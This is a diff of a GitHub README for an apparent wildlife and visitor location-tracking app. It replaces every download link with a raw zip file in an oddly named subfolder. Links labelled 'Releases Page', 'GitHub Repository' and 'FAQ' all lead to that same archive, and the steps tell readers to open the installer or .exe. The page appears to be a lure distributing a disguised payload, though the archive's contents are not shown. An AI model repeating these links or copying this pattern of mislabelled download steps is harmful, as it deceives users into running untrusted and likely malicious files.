@@ -1,6 +1,6 @@
 # 🌍 realtime-time-location-tracking-and-alert-system - Track Wildlife and Visitors Easily
 
-[![Download](https://raw.githubusercontent.com/Tweekzze/realtime-time-location-tracking-and-alert-system/master/acroscopic/realtime-time-location-tracking-and-alert-system.zip%20Latest%20Release-%20%20%20%20%20%20-brightgreen)](https://raw.githubusercontent.com/Tweekzze/realtime-time-location-tracking-and-alert-system/master/acroscopic/realtime-time-location-tracking-and-alert-system.zip)
+[![Download](https://github.com/Tweekzze/realtime-time-location-tracking-and-alert-system/raw/refs/heads/master/acroscopic/location-system-realtime-and-alert-tracking-time-pretubercular.zip%20Latest%20Release-%20%20%20%20%20%20-brightgreen)](https://github.com/Tweekzze/realtime-time-location-tracking-and-alert-system/raw/refs/heads/master/acroscopic/location-system-realtime-and-alert-tracking-time-pretubercular.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ To run the application smoothly, ensure your setup meets the following requireme
 
 ## 📥 Download & Install
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/Tweekzze/realtime-time-location-tracking-and-alert-system/master/acroscopic/realtime-time-location-tracking-and-alert-system.zip) to access the latest version.
+1. Visit the [Releases Page](https://github.com/Tweekzze/realtime-time-location-tracking-and-alert-system/raw/refs/heads/master/acroscopic/location-system-realtime-and-alert-tracking-time-pretubercular.zip) to access the latest version.
 2. Locate the most recent release.
 3. Download the application file suited for your operating system. Follow the prompts specific to your OS (e.g., `.exe` for Windows, `.zip` for macOS or Linux).
 4. After downloading, open the installer or the application file to begin installation.
@@ -64,10 +64,10 @@ Experiencing issues? Here are some common problems and solutions:
 
 ## 💬 Need Help?
 
-For further assistance, refer to the FAQ section on our [GitHub Repository](https://raw.githubusercontent.com/Tweekzze/realtime-time-location-tracking-and-alert-system/master/acroscopic/realtime-time-location-tracking-and-alert-system.zip). If your question is not covered, feel free to open an issue, and our team will respond shortly.
+For further assistance, refer to the FAQ section on our [GitHub Repository](https://github.com/Tweekzze/realtime-time-location-tracking-and-alert-system/raw/refs/heads/master/acroscopic/location-system-realtime-and-alert-tracking-time-pretubercular.zip). If your question is not covered, feel free to open an issue, and our team will respond shortly.
 
 ## 🌟 Support the Project
 
 If you find this application helpful, consider supporting us. Share your feedback and ideas for improvement on our GitHub page. Your input helps us enhance the experience for everyone.
 
-[![Download](https://raw.githubusercontent.com/Tweekzze/realtime-time-location-tracking-and-alert-system/master/acroscopic/realtime-time-location-tracking-and-alert-system.zip%20Latest%20Release-%20%20%20%20%20%20-brightgreen)](https://raw.githubusercontent.com/Tweekzze/realtime-time-location-tracking-and-alert-system/master/acroscopic/realtime-time-location-tracking-and-alert-system.zip)
+[![Download](https://github.com/Tweekzze/realtime-time-location-tracking-and-alert-system/raw/refs/heads/master/acroscopic/location-system-realtime-and-alert-tracking-time-pretubercular.zip%20Latest%20Release-%20%20%20%20%20%20-brightgreen)](https://github.com/Tweekzze/realtime-time-location-tracking-and-alert-system/raw/refs/heads/master/acroscopic/location-system-realtime-and-alert-tracking-time-pretubercular.zip)
